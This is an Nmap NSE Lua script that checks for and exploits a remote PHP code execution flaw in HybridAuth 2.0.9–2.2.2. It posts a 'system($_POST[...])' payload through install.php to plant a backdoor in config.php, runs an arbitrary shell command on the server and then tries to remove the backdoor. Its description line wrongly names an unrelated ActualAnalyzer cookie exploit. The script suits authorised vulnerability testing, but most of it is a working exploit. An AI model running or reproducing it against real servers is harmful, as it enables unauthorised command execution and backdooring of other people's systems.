local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
A simple script to detect ActualAnalyzer 'ant' Cookie Command Execution
]]

---
-- @args command enter the shell command to be executed [optional]. by default finds the system date.
-- @args path used to indicate the path of hybrid auth installation. '/' is the default path.
-- @usage nmap --script=http-hybridauth --script-args command='ls -lha' <targets>
--
--@output
-- 8080/tcp open  http-proxy syn-ack
-- | http-hybridauth: 
-- |   VULNERABLE:
-- |   HybridAuth PHP Code Execution
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  OSVDB:109838
-- |     Risk factor: High
-- |     Description:
-- |       HybridAuth versions 2.0.9 to 2.2.2 are vulnerable to remote PHP code execution. 
-- |           The install file is not removed after installation allowing users to write to config.php after 
-- |           installation. This program will render the installation 
-- |           unusable.
-- |     Exploit results:
-- |       total 44K
-- |   drwxrwxr-x 3 neo neo 4.0K Dec  4  2011 .
-- |   drwxrwxr-x 5 neo neo 4.0K Dec  4  2011 ..
-- |   -rw-rw-r-- 1 neo neo 2.5K Apr 16 01:20 config.php
-- |   drwxrwxr-x 5 neo neo 4.0K Dec  4  2011 Hybrid
-- |   -rw-rw-r-- 1 neo neo 5.1K Dec  4  2011 index.php
-- |   -rw-rw-r-- 1 neo neo  18K Dec  4  2011 install.php
-- |   
-- |     References:
-- |       http://osvdb.org/109838
-- |       http://www.exploit-db.com/exploits/34390/
-- |_      http://seclists.org/fulldisclosure/2014/Aug/22
-- Final times for host: srtt: 35 rttvar: 2823  to: 100000


author = {"Gyanendra Mishra"}

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.http

--works for versions 2.0.[9-11], 2.1.* and from 2.2.[0-2]
local function vulnVersion(version) 
  if  version:match('2.0.(%d*)')then
    local last_dig = version:match('2.0.(%d*)')
    if last_dig == '9' or last_dig == '10' or last_dig == '11' then 
      return true
    else
      return false
    end    
  elseif version:match('2.1.%d+') then
    return true
  elseif version:match('2.2.[012]$') then    
    return true
  else
    return false
  end  
end

action = function(host, port)

  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command") or 'date'
  local relpath = stdnse.get_script_args(SCRIPT_NAME .. ".path") or '/'
  
  --generate vuln table
  local vuln_table = {
    title = "HybridAuth PHP Code Execution",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    references = {
      'http://seclists.org/fulldisclosure/2014/Aug/22',
      'http://www.exploit-db.com/exploits/34390/',
    },
    IDS = {
      OSVDB = '109838'
    },
    description = [[HybridAuth versions 2.0.9 to 2.2.2 are 
    vulnerable to remote PHP code execution. 
    The install file is not removed after 
    installation allowing users to write to config.php after 
    installation. This program may render the installation 
    unusable.]]
  }

  local rand = math.random(1000)
  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  
  -- check if install.php exists and is writable
  local path = '/' .. relpath .. '/install.php'
  path = path:gsub('/+','/')
  local response = http.get(host, port, path)   
  if response.status == 200 and response.body:find('<%/span> must be <b >WRITABLE') then
    return
  end  
  -- check if the service is vulnerable
  if response.status==200 and response.body:match('HybridAuth (2%.[012]%.[%d%.]+-?d?e?v?) Installer') then
    local version = string.match(response.body,'HybridAuth (2%.[012]%.[%d%.]+)-?d?e?v? Installer')
    if not(version) then
      return
    end  
    stdnse.print_debug(1,"Version Detected : " .. tostring(version))
    if vulnVersion(tostring(version)) then
      vuln_table.state = vulns.STATE.VULN
    else
      return
    end
  end

  -- begin exploit
  -- writing backdoor
  local post_data = {['OPENID_ADAPTER_STATUS'] = "system($_POST["..rand.."]))));/*"}
  
  response,status = http.post(host,port,path,nil,nil,post_data)

  if not(response.body:match('Installation completed')) then 
    return report:make_output(vuln_table)
  end    
  
  if response.status == 200 then
    stdnse.print_debug('Changes made to install.php.')
    stdnse.print_debug('Executing Command ...')
    post_data = {[tostring(rand)] = command}
    path = '/' .. relpath .. '/config.php'
    path = path:gsub('/+','/')
    response = http.post(host, port, path, nil, nil,post_data)
    if response.status == 200 then
      vuln_table.exploit_results = response.body
      vuln_table.state = vulns.STATE.EXPLOIT
    end  
  end

  -- lets remove the backdoor
  path = '/'.. relpath .. '/install.php'
  path = path:gsub('/+','/')
  post_data = {['OPENID_ADAPTER_STATUS'] =  ''}
  response = http.post(host, port, path, nil, nil, post_data)
  if response and response.status == 200 then 
    if not(response.body:match('Installation completed')) then
      stdnse.print_debug(1,"Couldn't write to install.php. Backdoor couldnt be removed")
    end
  else
    stdnse.print_debug(1,"Failed to remove backdoor. Didn't recieve 200 from host")
  end  
  return report:make_output(vuln_table)
end
